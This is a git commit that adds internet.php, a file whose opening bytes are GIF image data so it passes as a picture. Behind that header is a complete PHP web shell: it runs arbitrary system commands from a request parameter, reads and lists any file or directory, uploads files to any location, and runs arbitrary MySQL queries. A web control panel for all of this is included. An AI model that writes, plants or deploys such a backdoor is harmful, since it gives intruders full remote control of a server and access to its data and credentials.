4308961fcf3d4930a7e65ae7dbafad1a72047305
User <user@DJ5VL22T.fios-router.home>
2016-03-31 19:11:25 -0700

    second commit

---
+++ internet.php
@@ -0,0 +1,215 @@
+GIF89ad\00d\00\F7\00\00ORg\96ǥ\E8\F9\EB\FB\FD\\84x\A9*k\8Et\96\CA\DA\F4\FD
+*\8D\C4\D34\C6\EC}\A5\D6\C8\CB\D4\E2\F6\FD\9A\E6\F9\D2\F2\FC2\AEԈ\B7\C7E\\997\8F\B3\87\B7VyHg\FE\FE\FE\AA\CD\D8V\B1\CEE]\A28d\A4i\95\E4\FA\FE:Jm\F8\FD\FELa\9C-\BC\E2Vf\A2\FE\FE\F9\D7\EC\F4\BA\EC\FC\85\DA\F7c\8By\D9\F5T\C7\E9\BA\E4]\91\A4nq\86\FC\FC\F3\E9\F6\FC\B7\BA\C4h\87\C0\D5\D9\E1\A8Ӭ\AB\B8\E8\E8\EEo\BF\D5k\D6\F7\C1\EC\FC\BB\F3\FDXx\B7:V\CC\F2\FC:l\FF\FF\FC\98\AB\BC7\\A78_\95\F4\FE\FD\88\E4\F8D\C4\E8q\9E\A4\DB\E6\CA\EE\FCo\84\94\93\9A\A8Ia\A3<c\B0\E8\EF\F9\8B\B4\E2Ta\9E\CC\E4\E9\B3\EB\FC\DD\F8\FD\DD\E5\E7Cf\B2\F0\FA\FD77SB\CB\F4[\D5\F9b{\B3\8E\BE#X\86\A0\CD*C\9C\D4\E2A^\F3\F7\FD\98\C2\E1";u\D4\ED\FC\FC\FB\F1\FE\F6\FA\FA\FA\FE\F5\FD\EE\FE\FE\BB\E1\EA\C4\F2\FD\F8\FD\FA\C9\EACc\9F\80\AF`\CA\E6\AE\DB\D3\F2\F7\B3\DC\F9\FA\FD\DB\F0\FA\95\DF\F8'L\81\FD\FA\FDi\E2\F5\CC\EB\F62KJqX\99\C2h\99t\A8\B7\B8\D5\DE\q\AC*c\A5\88\88\99\AC\D4\F4Z\BE\D5\FE\FC\FE\F3\F4\F4\D5\F9\FE\E2\F2\F8h\D3\EB\F4\FC\EE\85\B7b\89\EC\FA\F4L\87\9D,Z\94Kc\AB\FB\FE\FEW\CC\F0\F5\FA\FE\EC\F4\F6^\80\BE#8lS\AF\EA\F5\A8\CE\EB3\89\9FGx_~\F1\FC\FB\87\D5\E59U\88#\FE\F9\F8\B5\DF\86\A7\E4\F8\F8\B9\E9\F3B`\AD\FC\FC\FE\CE\F0\F6\AE\E6\FB\FB\FF\FB\F4\FE\F8w\9Ag\CD\F0\CD\FB\FFV\D9\EADh(\99\C1u\CA\E0\C4\ED\F4Mi\AB\B9\D7\F4\A6\CED\BBߺ\E1\F64\A4\BE7+_+z\9F\C3\FB\FE-T\EE\F8\FA\AA\E1\F28[
+\9B\BA'+<E\A4\BEPp\AD\E5\F4\FF\FC\FB\E7\ED\EDp\8CM\D1\F7\91\BD\C4\F2\F66^r\F6\F9\F7\98\E1\F0Rn\B1\B8\E7\F8n\8A\AE\F2\F7Ig\A13K\83\8B\DF\F1?j\AC H\C6\E2\F1\EF\EE\F2\B5\D2}\9EQr\AD)N\8E\F7\F7\F8\DB\F6\F8(?}9{\90Nu\84\A1\CB\EF5\D9\F2\CF\F7\F82H)t\BC6R\97`fy\C1\E8\FA0k\B3Am\B8Ok?+8\83\B4\80\BFFFV\A7\F0\EB\8F\CDۺ\F3\ED\8E\C8\FA\DD\D4\E5\9E\C4\ED\90\AF\9C\B3\B5\C66l\A7\DF\F1\EF}\80\8B\FF\FF\FF!\F9\00\00\00\00\00,\00\00\00\00d\00d\00\00\FF\00\FF	H\B0\A0\C1\83}\F8\C0\80\E1@!\FEc(P\A2Ë3j\C4H\91`Æ'zI\B2\A4I\84ET\B8\F2\A4˗~\\98j\A2\8FT\90@\E8\DC	)U*> 1\DA\A6Q\97 ?\8EQB\88NPH\9D
+\95\93S! >\F2\A8גv\C6,%\C3\C9\D7\D4/8X\CB6mZ\B3gT9%1\86\D0׻!M\95)É\A3QخE@\B80\DB\C0F\F9\F55\92]\BC\90\C5 \F6\E9\97}+\8C\00\A0C\C3A\F0-JQFE\F1\E0˪\A9\8FC#\C3\8A\E1\F59T\BE\F0\F0\E2\F4\9C\D0Gp\98\C0\81C\9D\BA\E2Ǉ=\DA\F4$\E9dH\E8\E3C\81]e_\X\83/\B4\FF\E2\C1#
+\8E\E0G\F0,\FF\F6\CD\C1\B7Q\DF \E0\C1C\FC<\84ך\E5\89kQ\ED$a\00\89)r1\C0\87\F4\F6qx\C01\CAYIĐDQ\E1\CB\E9\E1\90~\8C\92 \84\A6\FC\93\80A\92\A8\C6\B2\C82\87\904\860$\E1O\E9\00\00@:-B5\F1O* |s\8A4.\CEQt\92LFЈ\B2Y4$r|W\9A!\A7\CC\C5I\F1C:U\BC\F3ɘd\969\A6;\F8\C31
+\00G=x\80\E6\80xSFl$\B6$B0\82\E5၀1\FFd\F3%0\D7$`\E6\A2f\E6\CEH4P\C6?B\C0q\AD \90\987YM\94]\9E؅\C5'\F0A\B0\8C,\DF)E\D4\E8\92\CB5\B9|\FF\92˫ׄ1k.	(\FAI\EE\E4R\89'\B3p\838!Р	\A3\D0\81!\A9
+ \84\89\9F橔*\BB}%L\82A!I|\00N7\BA\80\D3Ka\A0\83\8EL\B6\DAj\AE\B9~\80\851P\A2\B14\C9\C42\A7(\E9 \98\A8\80IM\A4\CA(\A3 \00\80\F0\\A3\CB5\BDh\D2C\BDt\B3\C4\C6@\BC\C2E\Ա.\BB\B3\EEJ
+7:PR\EF\E0\A4#\85@\90\C6h/4\93U\B4\DA	5*¿}\83\C1$H\B8\9AKݠ\D3K=,\C1;Kp\A0	PsLP\B3k\AB\AF\D3<\F2L\CA1\E80\ECAY\85i	\A89A\C2I`\9C\E2\8B
+xRI.\C0\F4\00Ny\BC\E2\C8SL\FFQ\8A#x\E7!\B8\E0Q[ͮ.Ԡ\AC\F4R2
+8-\E2\A70\EB'
+AYO\CD\F4G9`\00C\9A\SG\BDP\9D\B45\D68\E2I^\EC \FB\EC\82\F3\8A9P_\CC\8F(\A17\C0\AB\C3\950#\C5?\A3\9C\C77\8Cx\F3\C1\99\A2\86/Qx\C6\C8?T\D2M@\B0\D3\BD\00Ӻ&\AFľC\EC^\98{Ӱ5w\87\A0\C4\BEO3\CB3\DCP\A2\F23\D4| \C3?\938E9፺@ \A0\C2 0\872\90 	\BD\00:\AC1G\F4by\B0\84\D2\C7\C1\A6\EF;hGB0\81
+\A0\A3\E8`\FD槄G<e\{:\FCG,\E3Th\D2\88\809p\C2?\D0E\FF\F8\B6 `\F0|\F8\E0\96\C8D&z\E1Ap\C2\F6B\B0\81\B2\90~\F4{D\B0\F2\83(a\862\C0\C0(J\80\87ig(\A5*\C4?h\A0\8D\9D\CBݐ/\A0\87%\83\C0\E3\F5\A0\89 (!PĢﮘE\FB\A1L\940\E1\B2\89\C0\E002a\88$\A8\E0\9EC\90\A0\95\A8\C3\96Ѓ\D4\E1|\AC\E3\89\A1\87Q\EAA\D0C\A6ABK\B4\A3\8E\E4fI\CB\F9i\F1\90]+\85'& z\FC\83$!\941<\CF(0\86$\E4\00\E3@\00\C2#\B4Ћ
+\CEю F6-\90M-X\82\94\DED\C74\F4\D0-\F8\8E~%\9C\E5\FCJA\BF\FBq\8D\8F؀'\F2p\81hdbp@c\B6\82\FF\B3\90,DDe\B8\CC!\BE\00\89\A0\A3\95\E8\81&B\D8\C4Qj\93\9Bܴ\84%\E1b@Ղ\DA1*\AA\90\96X\\E1\825\8B\94\E9\80\FC\A0\AEr\91\87UĢf0F\E6f\942\F8\C2L\C0\00
+\C0\8E\B04H\CC\E3(!j\C0\8B0\80\82QGx\B3A \E1\B1h\C5Y\C6s\A4\B3\F8\9D\CA\E29
+M\84AQ	\F0"ZA5<&B\91\84\A2\00\89P\A3c
+\83\EDxG\A2\F5\AEXD\B5\B0\D4:\C1	\F2s\D9\C0\C2xJ\95wZ\8B\A1:\A9\861\85c\DE \C3YM2\93F:\80\FF\84\ABvT/0\B1\AE\DC4*
+FK\DAE\A0`\A9\FDkF0H*\E1\A3\F4\F3D{\80խ\FFum\96\D3\F8\E4\D5[\C8 $\80I$A\85C@\E2\BA S.\94(Tnn\82\00\A4\8DF\A6\DB>\A4+\80e%`+?߅\C0\\98\86'z1Kjl@\8B[K\D9U9p\CA\84\8A\00\A1^}c\FFHG\99\C2\F0A\D0\BA\A3\A5n\8AP\84p`\A9u\C24TX%\F0Uo\ED\AF&6\C06\B8pq\94x\C6\80\C0K\BCb\89\F9\88\868 A\82~Ƥ!}\FA$dp\8D]\ED\AA\FD}\A8hQ@]\80\C0\D1X\C5F\C0\E3\BFF\91\BBU\A4\A3g-\D1Qj\84L\85-\C40;\A2	@\BC\C2(P
+я\94\C8\C4يF\A1F\94)A\951\80\A7\8D\98\B9\00{\D8\E0,p\C0\FF\00|`\83\E1W%\A1\8E\9A\885\A8\88\BA \A8s[\A3;8\00@\F0C\D8F*\8D\B0;\CBH21\891\F4C\FB\DD6C\DD\E9\E1\CCmP\84=\F0\86&`\DED\9C\F9\BA\DAiAZ`:<\B1\CB*r\A1VU\C2\FD]\E8&"\DBPF\00\8A\D0\96`\D9!\A2~\A0\AB]ɕ\8Eڼ+\8D\\806d!\D0\C0-h1\8E&ģ\00\AB\E0\C3":\A0\D7MD\D5\8BHp\EF\AA8O\98\97\9D\BA\DEZ\F7\C6>T@"\D8B!\92cd(T\E0\8F~\C9D.\CF>\F4\BF4&\F0\A2\AF\00D@\A0\B4\D0@\CC\\84i`\9Bp\84%6\C1\86ĳ\84\B0b<\A9\B5g\A0@\FF\D0BVp\85\D4"\00ȨrW\FC\EDB\F850G\B3s\C1MG\C0	Wt`R \A0\9D\B0,`x\C0\83|\88:
+\A2\B1\89oJT\A2AP!\C8A\AA\C5Y<\80\D0x\D60\84D [(B0@\88Q\96\00J6&\96O\B8\99+\80Zx\80\A0\90\843\E8!L\80\81\88\A6>ڣf\B3\940\E7
+\E7ǆ\96b@\B9#\F4\90\855T
+tDfІb{C4/\D4\EA$؊L \F3yQI;ݽ vP\C8 \87C\A8\C3\F0\88\8F2:\D0x\89f\F3\8E^0'IH
+OP\F1@X\C2:\BA\F1\8A-\AC\B2\B8\84\00\DC \827d!B \84\FF\92\92z\C0\BD\CC\C0쁚Ǽ\B8\D6\80H\90;\80b\00G\F8}\A9\FF\98\96\00\80\C5WKEy\F4c4\BB\D4
+\80\BA`o@9\80\D2p	\C5p\B6\80v\ABPr \C0	 \D0;\D0l\E4"8^`Q@\F7~\F1Q\00
+r\A0Gp\82px\89\87&\80\AB5#\A4\D0q0Ul\00\B3\D2\B0
+p\86\00&\90\84\A8P
+\B6oP\00`Pb\94	T\80~0.\B9W\9D\F5s\F6iP\CA\E0\ABA'p\DC&\831\B0c\C6]u6\DD\E0gX\C4\D6\00aP	\D7\00\AE0\86\80!8\90]`Π\B6\F0\F9\B0> S&\E1f\80?\82\BA\FF2\82y\E0\A8]@]gG\F09\A40\88M\C0\00m\D6cN\80\83#4B\E1E:YU
+\A5\C0\E7\E0	\BA\B0D\90G\B0V\86\00\AD@`\A8\C0
+\B6 Y$\%\B1f@}\F0
+\B9\A2+a\D0Y\E0~\9FVÀ	\B4@
+\EA\80
+\9CXx\9F\8A48\8A\A5؍\BE\C3\9A\D0
+֠\9B\AF070g`7\D5\F4\D0\8B\00
+&p* \C1\00\8Cc@Y \D0\C0ݐ(\EB';Ke\9D6]\AB\C0\00M0\82\B0\909\9E|;\96`&?\E1\D54\DD\D0\E1\80\D0\A90~\E2\00B\D0`\C8P
+ n`\CA\C0>\C1\81$`
+\8D\00԰_$X\82\D1\FF6m\00\80\90`\80鉟8\83\A2\98Z\A5\F8Z\D6U=`	0C 
+e\00
+\90\A0\9Cp\EA\A0\00\BF@p\92̠7\A0\AB R8\8Cj\E0\90\A5P\93\CA\C5̘Gc\86\BBГMP\97٘x\94\A0\86\C9]J\B0\A5\B0\80\C0\94}\F0\00P0
+\C60ϲO\A0@|\B0	\C4\D06\D0	)0\D1pvP~2A)\89\00	\DCO;ǖHD%\B8	\D3\C6X \97sٓКm\A6\868h\94#\C4~\8B\B0\F0\94 v`d\00
+c\80\AB\80\BBP\9Cð
+\C0p\99\D0yl\D9qev@\C4\F9\A5\E0'\9A\9E\95D%H\00\D2e\00\90\9Ar\FF\D9E\E4\89z\89]\E8Ya\00\98\80\B0\83\F0yp@\9Dv\80
+\A7`\D1P]\B0	\D0\8D`\B2\00
+*\80Ǡ9\C8V>@\A7\B0\95~{ۉ>\C4`\9Al\C0c\9Em\86\E6Y\94\AB\D3`
+\B0\80\C0\F0\A0\CE@
+\E5\C0	\A0\90
+	\8Ap 
+\80
+\F0d0\90\C0\E5\E0Ȱvֱ3G\A90\00\99\E0\8E\C0\AA\D8bq\A5\9D\EA#\89\9B\80`\ACd\A1\B0\99Z\C6Z\CAA\00\E0\94p
+gЛ.\00
+\A0@ \80%\00\C0\83P\D8\E0O \87\90@}pf\E5)A!+jĐ\8E`r\B9\967\89Ad	~\F5WU\DAc<\FF\B6Z\8F\C0 \DA
+\8B@*p\BF\00.\E0c`f\A0
+fPQ\80
+\CA\00s\ABP\D1\E0T\F2\DE\00\C3@	j\99\83\E1\87\AB04|\A0\F3\88\CB\D8Y@JP\DC \91\FAW\CA:ր\B0\AC0\F3Pr\90\99\FF`
+?T\8C\A7\00]\D0m`\F1`\BB`x\92\80\B0
+\F4@r a
+g`!\C8\8B\A0\A5\00\D0l\BFz>\82#G\9E\B5`\8A\DAc!0\AC\E0P	Z0\AE\90\D2\C0Vv\C1\A0\C0g\80\93@
+m\E0c\80\9F\A6\00\F4\802\D0\92\E0\93 qÀ
+\80\F7(i\FF@\0+\C4\D6P
+\E8 \82l	T\FB
+J\C9\FF\87`! \87K\E3\B2\D4P	\ED\B0\B6\E0
+ՀT\A0
+\A0\C0	\C6pt\00
+.@.Y\F0R\00\FF\B0\A2\80}\F0"\D9\A6Pð
+%*sgC\AB	\D1oE\9F\D0s\00/[
+\BAૢ\B9qk>\C02\EC\C0г\ED\B0
+\B5@w\F0\00p $`v f\90
+`f\80\98\806\00\CAp\A0\00
+q\00\8B0\AEaJ\A4PP`\E1\87,\EA-SBg\80\B6\91h|\00\997ɵ+\E42Q>\8Bv\DD@\00mP\90C\00\A0\BD\E9
+ `\B80\00\B8\90\EA@Y\A0\C1\A0
+\90
+\81p
+8\F2\84 \D50۰	\AB\FF\00
+p3\D7Q\BE\92\F1\A3v\C0F\B0\8C^\C0\BA\BE\86.-\A6+C\D3X>5\BFdP3\B0~+\00Q\A0
+.\A0d\E0T\A0`E\B00\00\A0\B8\80\8A\D0	\DBP\00\D0\00\EE\E05\00\00U nѠ(\D0\C1\80
+Q	\CA!""\AAw\BE~\D0\C2\00 \89( \A2\BD.\8D\92+\\E0\9B
+\F90\A1\C0\BFw\AD_\00w\97CBp\CDP\8CF\A0\93@\98\A0L\E0\B1\00\86\8A\C0\80\98\D0\00I`v\D0\00	\A0\A2\80G9\9C\B0)5\D0\FE\D0\00
+@. \F9h\B2\81$P\CC \B2\90}\B0\F0`
+\EB@h\EB\E6 U\D0\8B\B0
+"\00<
+pt\FF\90\E0\A7\81iA\C4>\A0
+\8C\E0h\D0%@\B4P߰\C6P\00\DB\F0\93\F0r\A0#r@(-`wz\90h\A2P		\00\00\E0- \F2\E0\81\A0\A9&B\92\\D0\8D 
+\D0@\F4\A0\00
+`\83Є\B5\C1\B0\DA nP
+\A4\B0k\B5\A8$Ņ\ADA6 T\00	RP\00$\8B
+m\80\89\00
+\87@\B8\D0f"4\90\00I\80jP°\\E6p
+\AFp
+\B2|l0@-\E0\F7\\C2(	\AA\D0\E6\B0ڄ\DB 
+\A2\90
+ѣ\83\BF\A0\CBP\962GXsp\9A1T`!۰\DAR\AB $Pۀd
+	\BE`\FF<\A6\D0*R\90\A9I\C0+\EE\E0#\9F\C1\C5\F9\F25\E0\E9\00.\C0\B4
+\84\A0\AD\979lq`-C\F0\00\A8\A0\E20\A4@
+9\90\B0\87\D6
+\B0\00g@~\F0\8C\00\93\B0
+\E3@\87\B0
+~\F0\91\C1e\AB\84\C0հ\AB\F0	-\F0\DB&
+\D0\B0lj\80-\F05`>\90\9F\00\D5:)Av\E0O\90ĀE\A0\D0|t\F0\00\00a\CD\E5\80\00/ \A6\DD]\90\A7\90T9`h\D0\8D\B0\99\F0\]0~\C0\A5g 
+M\80_\B0
+Qh"\82.P\E4
+\80+\EEp\D8\93\004\E0\A6p\F0\ECv\90
+\EF\90l\F7U\FFP\85P\F9x\D9lG\90 ;@\00\9F\B6\E0)0ڨ\90?\C0\B4\00\86\90P\D0y\C0\BC@
+\90\B9tl	\A0\00j@\B0\D11
+\E30\A9М|B\8E&A
+ɰ\DB\D0X.\00f \E9 \85\D0-.\B0F\FE@$\E00\F0	I\E0\FCh\B2qI\`\9AE\90\B6\A0)p\A4
+\F0	,\E0x`9\A0\00\F4d\00\F4 \E0\8B`\C07ڪ\BB\80\99\AC\00 \FF@,ഓ\90
+Ɛ\A4	\A1\A0;0&\8A\F2*\D2-\F7\F0\810\D9 0\80e@(u\91\99\00\E0R\D0J}B\CA\E0\D9\DBP*\C0
+'0\DAŐ`H \CC\F0
+\FF\00;hp	\82\CC\C8$\D9p\BB\B0	s h\D02 
+\B0vc\9A`\A1\B0\E7\B0\B1\B2+\EB\E2^\C2\C0\D5\E1\EFF\84\90
+\C6 \E2-w\822\90\00\FE\C0\E6\C7Vb\90\EA]\00\CA@n t\E0\C5 
+\F0	\E6\C0a\C09@y\D0\BC`,\80\9Cg\D0
+\C8p\E1\D0İ\9C\E0
+\DE 	\8C A\DFP
+
+\B5\00ݰS\80\9D\9F\90I\BD@J\BA\EE.p\DBM\A6\F0\D4\CD\A9\E0\93\D2	\D0\00\91F\AB\84`s\ED`QE\B0
+q\D0\E78\FE\A8`\EE\D0g	\AD\C0;P\AD`\8B\AE\00\D0\90	,\D0Q\80\930L\94\B2b 3\A0\E7\FF\00\B3\E8\C0S\A0(\95\F0\C0Ќ\D1\00\AF~\E20@\D9\E6{6\D5\C1U\00{ab\B1\AEI\00\D5lĞC\80\EC9\80	P\A7\E1\C0,@\BC\F4Dؠ\99p\8ETj0s\E0\B03\EB\B01\80P
+S0=\F0	\BA\F0\8E@G\BD\B9\C0\DDcp\E2]!%*-\D050)J_b5\00\C4
+\F0*`\D59n<>\00\E2\CEp	Z\EDp	\A4 ]\B0^\E0_\E0T0\BF\A0\DA0P\EA\E3\97K0\B1\DB
+\EC\F0
+\BE\C80\D9q'*\9B\F9^\D6\00v\82ep,"H\90zD\80'\E0\A4\CD\90\E5\90\E6 \CB\FF\F0\A4o\B2\D0
+\9E~  ]
+n\00\F7\CA \F7\EC\F4\97\B6\CF\E8+\B9\A0\D3\D9Ȱ	aP\CC\F0	U\00\D9L\8D\F9W\D0\E0A|\D4&o\A0\B7\831\F4!\E5Յ\DB*苔\A2P\8CHXv
+Ψ#\A4\D2\E40\C1\EB\82C\FDr!\B2"@\8B\D6-)\B5ħ\CF)K\A6\80\FBt\8DK\9D)\96,ڑ\A0
+y\00\F2A0\E2U\824>%\F1\E1\C2\D8Ղ
+
+\BA\F0\D3\EEB\B46Y"\889\E1L@\B1\96%\A3\BC\F0p$\C7Мu\B2%bF\BEhz\B8|*\CA\E6\E7a\9F\EC4\85\D9q\C1\D2"E\F4\BCK\97\ED\DF1H\FEh`\80V\E2P\00h\80j\E6óB\D3
+	y\D2\C8\816\F9\88\9C\00)-G\FF\97N1kP}\C1\00[ȓ\8B\F0\F1OԂ\FE\EC\B4N\AF\C4^\E8\D0fU\98$\BE\FA0=\C6\EAUӦ\FFa\A0\A0F\B6Ҟ\FF\82\84a_<d`\81lS4Q\B0p
+\E3?\97>}\F2i\A3\88h6\B9\A08\E4\FCk\80\E0\00\A8)\A6p$\8F\88!\80\BA"
+\A8 \00dށ\A1\81{\DA\A3\8C\89\C0Jm\BC\92ت\99B\D4K\CE$`\94oi\85\94.l\D0\00e\B2\A8\A0\8D6\B6)\A2\88M,\B0\C0\8B<\C2#\97\p2\81㠼\C6\AC\F9\C9@\F4\D0\E352Lk\8B\B4i\00a\00ha4Ooo\BC!\B3\86fJ;00EF\F9\824\D41A\80RHf\817\B6\B8\A9\00>\A2A\FF\C1Hb.\D8\E1\D1\B8P2I\B9\B0\B4*yZ#Q@\A1\834\CC"\80\E2X@\83A\C2ABaj0\C5\F5\C2*\C8>\F1\E7\F1NKH_F9L\B8\C4:R\B8"+\B4\D9\C7\D06
+\BD\E0/\AA\B5\D6\DAW\F8\E1\87@\B1\E4\D3!E
+\00L\AC\C1"\DC\E8\A4\EC\00\80!\AC1`,\D1H\CA\F8\A7\86tޑ\AFԃq<^@\00\82#\84}`\88\DC \C2
+sC\D9b\83,\A2h\A3e\94\8C3\B6\E0\B1;\E8 Cqg\98!\94\AC\88\A3T`E#\FA\90\E0\9A*\B2\91A\EF&2\CDSR\A1A\98w\FC\B1\CC9]\84O`\82q\B8D\00\84Y1WdExc\86\00"nvH\8F=\F6\FF\F4\EAO=\B9\806*\CCPV`\B8\96\00\DEH\99\95~1\82$\CCiA)
+\B2W,)\D2I`\DFD
+iƻX
+\92#\BE\81\8F\C0A\9A8\FCz\83\88+\ACXa\85\CDB\EAP\9D\F2\F2ʻu\\91\B7"\99\C9gmlQ\996H\C1\E3\89(\93\F70 \9E\FD9ƅBʨ\B9\EF\F1L\A1b\00\81y\90\E5\E8\83o\88\84\888 \8E \92\C6EX!\91%\9F\BC껦~\F2\CD\C1y\85r\AF\B0E
+I!]1\E8x\00u \F8\C6$\00x\F3)Z\F8d\DF\؛w9\ED\94\E4\8C\E0\D3(\00*\C6s\DA*\A0\88\E5\DD`P+\88\F4D\B9\00D\F0a{\E0\F6ʕ\EF\89bHmWL\87\FF\88\D0P8\82!\BEq\88Id	\F0\EDz\96
+\E4\8ED\B2\E2\DDx@\B09\FC/\80\BBA\E2\96\85\AC*\B8\C1\B1\88\B0\00\E7=.oX\E2V\A0\8Dǉ\A0dV\B8\82\F7v\F1)\AEea\A1H"\C4P\8D@\C1<0D<@\85/\8C\A1	x\C7S\@\82BȁD$\A8\E1A\EC*\8C\E0x\B0\AF\80@\F4\98(\86\E1\86"\DE\E1X\B3\C2\86,V\F1
+\83\A0\00d"\BE-\98\8Dqb\C2\8AA\8Ae\94\D1\93\F0\85/\ a\B4\E0$\F0\86)8\F3\AF:\96\84\C0\00f\F4
+
+\A8x@5Ā\88H\88 y\A8@(\86dP`\83p+n\E0\CC;\DC\00\88\84(\B0\8BM\FF`\EC\92i!\95\D9T\E0E0^G(GF\F1\82B|O\A7L\84\FD\CA`X\E6*\96\F2FA\B0\82\A1C8\81\F1\90W(bn\83bђ\CE"\C1 \C3>h\94t\D0%\AEm\88t\E3SY'\C2iY\94\D3/\F8\82:\F1\F8ƪ\90H^u\BC\8A\BC`N\8C"
+\81\F3#/\AB1@A>-j?\A2Z\C5,\F6P\AD\85*-Z\9C\81\89\A02\8F\80.8\80\C37\E0u\CA\90P\83 \89x\99\94\A4\9E!\BD8A_\BC\00p\E8\E3%\8E挗\93\C2,\94\F4~$\B4R\CFk_\CBd\C6	g\86P\00\B8)p\C0\83rT \E9T\A7
+\A3\A7\82@T\F0\C0\9E  YP\D58L\8F(m<-\FFz\D4^O\DF\E0V"!\91\00\E1	:\A9O\8C\E2\A5\96JB\C0ʯ$5\E9,Q:
+\A7X\86	r\00
+T\80\8C50#\A1\82#\8Eu\C3EWfU\C0\BC\DC '\00\E3\\A1\00\85\BBB`x\C1\00$\A1T\B8\96\AB\AD\A1x\C4\E3\9E1\F0\CA\FE\83\00\B0{	T\E3t\A0\C3	+\86_\FE\92\88\B8\81R\B0\\F7\B2\F7|υ\86	L\80\F59\E0\8Cr\84Ugh\C8\DD\D5β\96\92\F8a\B6\D5>\E2\C0O\CFͭn\D7k\BENN\C3s\D5\E7sm+\8B#\F0\A0\A8Q8\EA\00@\E0\9D\CE
+\C1u̕B\00K/9H\8D\FD\8B\82!\C6'\C1\F9Ѐ)\9E\EB\E1\F7x1 `c\98\D3\94\E0\84\84@\9B\A9xŬ\EDk\EF\EE$\E3QdY`\87\B8qy\CB\CB0\87Y7\E5\9D\C3\93_\80
+\9CP\C3R
+<e8\D7\D0;ch#Ȑ\D5\F4\CF{>s\FC\FC\E7=\8Fb\A3/(\ADiA\E0\D4*\C7Y\D1\FE\92\D7S\D5 \87\97\B6\A3\FD\DD\EF\A0f4R\C1\C9Bxj\A7[\BBhP\C7\EAE0\E2NU\8CAK\D4v\FA\A9\AE4F\BCR\81+ّ\00nN\B4\A2\00;<?
+
+ob_implicit_flush();
+if(isset($_REQUEST['f'])){
+        $filename=$_REQUEST['f'];
+        $file=fopen("$filename","rb");
+        fpassthru($file);
+        die;
+}
+if(isset($_REQUEST['d'])){
+        $d=$_REQUEST['d'];
+        echo "<pre>";
+        if ($handle = opendir("$d")) {
+        echo "<h2>listing of $d</h2>";
+                   while ($dir = readdir($handle)){ 
+                       if (is_dir("$d/$dir")) echo "<a href='$PHP_SELF?d=$d/$dir'><font color=grey>";
+							else echo "<a href='$PHP_SELF?f=$d/$dir'><font color=black>";
+                       echo "$dir\n"; 
+                       echo "</font></a>";
+                }
+                       
+        } else echo "opendir() failed";
+        closedir($handle);
+        die ("<hr>"); 
+}
+if(isset($_REQUEST['c'])){
+	echo "<pre>";
+	system($_REQUEST['c']);		   
+	die;
+}
+if(isset($_REQUEST['upload'])){
+
+		if(!isset($_REQUEST['dir'])) die('hey,specify directory!');
+			else $dir=$_REQUEST['dir'];
+		$fname=$HTTP_POST_FILES['file_name']['name'];
+		if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))
+			die('file uploading error.');
+}
+if(isset($_REQUEST['mquery'])){
+	
+	$host=$_REQUEST['host'];
+	$usr=$_REQUEST['usr'];
+	$passwd=$_REQUEST['passwd'];
+	$db=$_REQUEST['db'];
+	$mquery=$_REQUEST['mquery'];
+	mysql_connect("$host", "$usr", "$passwd") or
+    die("Could not connect: " . mysql_error());
+    mysql_select_db("$db");
+    $result = mysql_query("$mquery");
+	if($result!=FALSE) echo "<pre><h2>query was executed correctly</h2>\n";
+    while ($row = mysql_fetch_array($result,MYSQL_ASSOC)) print_r($row);  
+    mysql_free_result($result);
+	die;
+}
+?>
+<pre><form action="<? echo $PHP_SELF; ?>" METHOD=GET >execute command: <input type="text" name="c"><input type="submit" value="go"><hr></form> 
+<form enctype="multipart/form-data" action="<?php echo $PHP_SELF; ?>" method="post"><input type="hidden" name="MAX_FILE_SIZE" value="1000000000">
+upload file:<input name="file_name" type="file">   to dir: <input type="text" name="dir">&nbsp;&nbsp;<input type="submit" name="upload" value="upload"></form>
+<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory here]
+<br>for example:
+http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix
+or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win
+<hr>execute mysql query:
+<form action="<? echo $PHP_SELF; ?>" METHOD=GET >
+host:<input type="text" name="host"value="localhost">  user: <input type="text" name="usr" value=root> password: <input type="text" name="passwd">
+
+database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
+</form>
+
+<!--	http://michaeldaw.org	2006 	-->
